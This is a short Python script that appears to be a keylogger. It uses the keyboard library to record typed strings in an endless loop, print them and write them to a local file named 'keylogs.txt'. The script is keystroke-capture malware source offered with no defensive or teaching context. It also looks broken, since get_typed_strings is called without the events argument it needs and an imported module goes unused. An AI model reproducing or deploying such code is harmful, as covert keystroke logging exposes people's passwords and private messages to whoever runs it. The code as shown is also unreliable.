import keyboard
import time

with open('keylogs.txt', 'w') as file:
  while True:
    try:
      for key in keyboard.get_typed_strings():
        if len(key) > 0:
          print("key pressed: ", str(key))
          file.write(str(key)+'\n')
    except Exception as e:
      print(e)
